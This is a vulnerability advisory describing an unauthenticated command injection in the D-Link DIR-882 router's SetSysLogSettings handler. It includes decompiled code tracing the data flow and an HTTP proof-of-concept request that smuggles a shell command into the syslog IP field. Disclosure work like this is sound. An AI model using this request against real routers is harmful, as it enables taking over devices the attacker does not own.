# Command Injection Vulnerability in `SetSysLogSettings`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | D-Link DIR-882 Router                                        |
| Firmware Version     | DIR882A1_FW102B02                                            |
| Vulnerability Type   | **Command Injection**                                        |
| Vulnerable Component | `prog.cgi` (input handling) and `rc` (execution of `syslogd` command) |
| Data Flow            | Cross-binary propagation via NVRAM variables (`nvram_safe_set` → `nvram_safe_get`) |
| Exploit Path         | Attacker-controlled input `SetSysLogSettings/IPAddress` → stored in NVRAM (`SysLogRemote_IPAddress`) → retrieved by `rc` → injected into `sprintf("syslogd -L -R %s")` → executed by `twsystem` |
| Prerequisites        | No authentication required; attacker can inject arbitrary payloads into the syslog IP field through the web management interface. |

2. Exploitation Path

```c
// prog.cgi
int __fastcall sub_432F60(int a1)
{
  ...
  v3 = (_BYTE *)webGetVarString(a1, "SetSysLogSettings/IPAddress");
  if ( !*v3 )
    return WebsSetResponseResult(a1, 0);
  nvram_safe_set("SysLogRemote_IPAddress", v3);
  ...
}

// rc
int sub_448DCC()
{
  ...
  v1 = nvram_safe_get("SysLogRemote_Enable");
  v2 = (const char *)nvram_safe_get("SysLogRemote_IPAddress");
  if ( strcmp(v1, "1") )
    return twsystem("syslogd -L", 1);
  result = *(unsigned __int8 *)v2;
  if ( *v2 )
  {
    memset(v3, 0, 100);
    sprintf(v3, "syslogd -L -R %s", v2);
    return twsystem(v3, 1);
  ...
}
```

3. **Vulnerable Binaries:** `prog.cgi` and `rc` (with cross-binary data flow).
4. 0-Day Command Injection Exploitation Path: In `prog.cgi`, line 5 executes `v3 = (_BYTE *)webGetVarString(a1, "SetSysLogSettings/IPAddress")`. The input is subsequently stored at line 8 via `nvram_safe_set("SysLogRemote_IPAddress", v3)`. In `rc`, line 17 retrieves the stored value through `v2 = (const char *)nvram_safe_get("SysLogRemote_IPAddress")`. After string concatenation, the data is passed into line 25 `return twsystem(v3, 1)`, thereby triggering a command injection vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/prog.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Connection: close

SetSysLogSettings/IPAddress=1.2.3.4;`INJECTED_COMMAND`
&SetSysLogSettings/Enable=1
```